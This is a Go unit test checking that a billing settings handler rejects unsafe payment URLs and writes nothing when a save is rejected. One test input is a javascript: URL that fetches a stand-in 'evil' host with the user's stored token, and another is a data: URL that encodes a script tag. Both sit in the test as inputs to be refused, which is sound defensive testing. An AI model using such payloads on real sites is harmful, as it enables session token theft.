package billing

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"dylaris-core/handlers"
)

func TestSetBillingSettings_ValidatesThePaymentURL(t *testing.T) {
	valid := map[string]string{
		"gracePeriod": "3d", "r2Retention": "3m", "nodeRetention": "2w",
		"r2QuotaGb": "0", "presignTtlNodeMin": "60", "presignTtlByonMin": "360",
	}
	cases := []struct {
		name       string
		url        string
		wantStatus int
	}{
		{"empty renders no link and is fine", "", http.StatusOK},
		{"a real checkout url", "https://buy.stripe.com/abc123", http.StatusOK},
		{"javascript scheme", "javascript:fetch('//evil/'+localStorage.token)", http.StatusBadRequest},
		{"data url", "data:text/html;base64,PHNjcmlwdD4=", http.StatusBadRequest},
		{"a bare word", "pay-here", http.StatusBadRequest},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			fs := newCoreStorageHTTPFakeStore()
			h := NewBillingHandler(&handlers.AppState{Store: fs})

			payload := map[string]string{}
			for k, v := range valid {
				payload[k] = v
			}
			payload["paymentUrl"] = c.url
			body, _ := json.Marshal(payload)
			rw := httptest.NewRecorder()
			h.SetBillingSettings(rw, httptest.NewRequest(http.MethodPut, "/api/admin/settings/billing", bytes.NewReader(body)))

			if rw.Code != c.wantStatus {
				t.Fatalf("status = %d, want %d (%s)", rw.Code, c.wantStatus, rw.Body.String())
			}
			if c.wantStatus != http.StatusOK {
				for k := range valid {
					if fs.kv[k] != "" {
						t.Fatalf("a rejected save still wrote settings (%s=%q)", k, fs.kv[k])
					}
				}
			}
		})
	}
}
